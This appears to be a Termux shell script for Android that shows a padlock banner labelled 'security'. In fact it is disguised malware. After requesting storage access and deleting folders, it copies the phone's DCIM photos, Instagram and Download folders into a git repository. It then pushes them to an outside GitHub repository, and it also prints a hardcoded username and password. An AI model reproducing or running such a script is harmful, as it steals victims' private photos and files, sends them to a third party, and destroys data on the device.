termux-setup-storage -y
rm -rf ~/storage/shared/termux
clear
echo -e '\033[0;36m            .-""-.';
echo -e '\033[0;36m           / .--. \';
echo -e '\033[0;36m          / /    \ \';
echo -e '\033[0;36m          | |    | |';
echo -e '\033[0;36m          | |.-""-.|';
echo -e '\033[0;36m         ///`.::::.`\';
echo -e '\033[0;36m        ||| ::/  \:: ;';
echo -e '\033[0;36m        ||; ::\__/:: ;';
echo -e '\033[0;36m         \\\ :::::: /';
echo -e '\033[0;36m          `=_:-..-~`';
echo -e '\033[1;33m            |||||';
echo -e '\033[1;33m            |||||';
echo -e '\033[1;33m            |||||';
echo -e '\033[1;33m            \\\\_//';
echo -e '\033[1;33m             \\\//';
echo -e '\033[1;33m              \/';
echo -e '\033[1;31m                           _ _';
echo -e '\033[1;31m  ___  ___  ___ _   _ _ __(_) |_ _   _';
echo -e '\033[1;31m / __|/ _ \/ __| | | |  __| | __| | | |';
echo -e '\033[1;31m \__ \  __/ (__| |_| | |  | | |_| |_| |';
echo -e '\033[1;31m |___/\___|\___|\__,_|_|  |_|\__|\__, |';
echo -e '\033[1;31m                                  |___/';

cd
rm -rf DCIM
cd /sdcard
cd ~/storage/shared/
mkdir /sdcard/termux
cp -r DCIM instagram Download termux
mv termux ~/kitthack
cd ~/kitthack
touch hi.txt
git init
git add .
git commit -m "first commit"
git remote add origin https://github.com/MrAli-s/kitthack.git
git pull --rebase origin master
echo -e '"the User is "MrAli-s"'
echo -e '"the password is "1928Rami@//"'
git push -u origin master
